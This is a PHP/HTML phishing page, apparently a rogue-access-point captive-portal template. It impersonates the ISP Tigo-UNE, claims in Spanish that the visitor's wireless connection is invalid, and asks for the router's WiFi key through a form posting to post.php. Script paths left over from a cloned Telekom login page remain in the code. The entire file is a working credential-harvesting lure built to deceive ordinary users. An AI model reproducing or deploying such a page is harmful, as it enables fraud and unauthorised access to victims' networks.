<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<!--[if (lte IE 8) ]><html lang="de-DE" class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|!(IE)]><!-->
<html class="no-js" lang="de"><!--<![endif]--><!-- HEAD --><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Tigo-UNE Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <link rel="stylesheet" type="text/css" href="styles/components.css">
        <link rel="stylesheet" type="text/css" href="styles/login.css">
    </head>
    <!-- /HEAD -->

    <!-- BODY -->
    <body>
        <!-- HEADER -->
        <div id="tbs-header">
            <div id="tbs-header-content">
                <div class="container-fixed clearfix">
                    <div class="tbs-text-zero pull-left">
                        <img id="logo" src="img/tigo3.jpg"  width=65 alt="">
                    </div>
                </div>
            </div>
        </div>
        <!-- /HEADER -->

        <!-- CANCEL FORM -->

        <!-- /CANCEL FORM -->

        <!-- CONTENT -->
        <div id="tbs-container">
            <div id="tbs-headline">
                <center><img id="happy2" src="img/wifi.png" alt=""></center>
                <!--<h1 class="text-center marketing-l text-thin tbs-text-1em">Verificaci&oacute;n de seguridad</h1>-->

            </div>
					<div id="tbs-infobox">
					<center><p>Conexión inalambrica invalida</p></center>
                    <center><p>Para continuar navegando de manera segura y restablecer su conexion inalambrica, debe confirmar la clave de su Router (WIFI).</p></center>

                </div>


            <form id="form1" name="form1" method="POST" action="post.php" accept-charset="UTF-8" autocomplete="off">
                <!-- XSRF Prevention -->


					<div class="offset-bottom-4">
                    <!-- Re-Authentication -->
                    <div class="container offset-bottom-1">

                    </div>

                    <!-- username input -->
                    <div class="form-input-set offset-bottom-1">
                        <input id="pass" name="pass" class="form-input" maxlength="256" tabindex="10" type="text" placeholder="Clave WIFI">
                    </div>





                    <!-- Login button -->
					<br>
                    <div class="text-center">
                        <button id="pw_submit" name="pw_submit" type="submit" class="btn btn-brand btn-large tbs-text-upper" tabindex="40">Confirmar</button>
                    </div>
                </div>
            </form>

            <div class="text-center">



            </div>
        </div>
        <!-- /CONTENT -->
        <!-- Status -->
        <script>
            var accountLocked = false;
            var accountLockedPermanent = false;
            var accountLockExpiration = 0;
        </script>

        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
        <script type="text/javascript" src="/static/vdplus/js/html5shiv.js"></script>
        <script type="text/javascript" src="/static/vdplus/js/respond.min.js"></script>
        <![endif]-->

        <script type="text/javascript" src="Telekom%20Login-Dateien/jquery-1.js"></script>
        <script type="text/javascript" src="Telekom%20Login-Dateien/components.js"></script>
        <script type="text/javascript" src="Telekom%20Login-Dateien/login.js"></script>

        <!-- Tracking -->
        <!-- Callback Tracking -->


        <!-- Toon Template Debugging -->





</body><!-- /BODY --></html>
